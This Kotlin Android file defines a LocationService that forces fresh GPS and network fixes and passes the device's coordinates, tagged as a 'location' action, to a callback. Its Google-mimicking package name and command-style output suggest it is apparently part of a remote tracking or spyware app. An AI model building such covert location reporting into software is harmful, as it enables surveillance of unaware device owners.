package com.google.xmodzz

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Looper
import androidx.core.content.ContextCompat
import org.json.JSONObject

object LocationService {
    fun sendLast(ctx: Context, emit: (JSONObject) -> Unit) {
        val obj = JSONObject().put("action", "location")
        
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                var emitted = false
                
                val listener = object : LocationListener {
                    override fun onLocationChanged(location: Location) {
                        if (emitted) return
                        emitted = true
                        try {
                            obj.put("lat", location.latitude)
                            obj.put("lng", location.longitude)
                            obj.put("address", "Lat: ${location.latitude}, Lng: ${location.longitude}")
                            emit(obj)
                        } catch (e: Exception) {}
                    }
                    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                    override fun onProviderEnabled(provider: String) {}
                    override fun onProviderDisabled(provider: String) {}
                }
                
                // Paksa minta update baru
                try { lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper()) } catch (e: Exception) {}
                try { lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper()) } catch (e: Exception) {}
                
                // Timeout 10 detik
                android.os.Handler(Looper.getMainLooper()).postDelayed({
                    if (!emitted) {
                        emitted = true
                        try {
                            obj.put("lat", 0.0)
                            obj.put("lng", 0.0)
                            obj.put("address", "GPS tidak merespon, coba lagi")
                            emit(obj)
                        } catch (e: Exception) {}
                    }
                }, 10000)
                
            } else {
                obj.put("lat", 0.0)
                obj.put("lng", 0.0)
                obj.put("address", "Izin lokasi ditolak")
                emit(obj)
            }
        } catch (e: Exception) {
            obj.put("error", e.message)
            emit(obj)
        }
    }
}
